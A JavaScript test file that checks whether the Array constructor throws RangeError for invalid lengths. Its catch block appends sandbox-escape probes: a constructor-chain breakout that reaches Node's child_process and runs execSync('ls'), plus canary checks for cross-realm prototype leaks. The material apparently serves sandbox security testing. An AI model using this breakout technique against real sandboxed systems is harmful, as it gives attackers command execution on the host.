try {
    try {
        new Array(1.5);
        $ERROR('#1.1: new Array(1.5) throw RangeError. Actual: ' + new Array(1.5));
    } catch (e) {
        if (e instanceof RangeError !== true) {
            $ERROR('#1.2: new Array(1.5) throw RangeError. Actual: ' + e);
        }
    }
    try {
        new Array(Number.MAX_VALUE);
        $ERROR('#2.1: new Array(Number.MAX_VALUE) throw RangeError. Actual: ' + new Array(Number.MAX_VALUE));
    } catch (e) {
        if (e instanceof RangeError !== true) {
            $ERROR('#2.2: new Array(Number.MAX_VALUE) throw RangeError. Actual: ' + e);
        }
    }
    try {
        new Array(Number.MIN_VALUE);
        $ERROR('#3.1: new Array(Number.MIN_VALUE) throw RangeError. Actual: ' + new Array(Number.MIN_VALUE));
    } catch (e) {
        if (e instanceof RangeError !== true) {
            $ERROR('#3.2: new Array(Number.MIN_VALUE) throw RangeError. Actual: ' + e);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}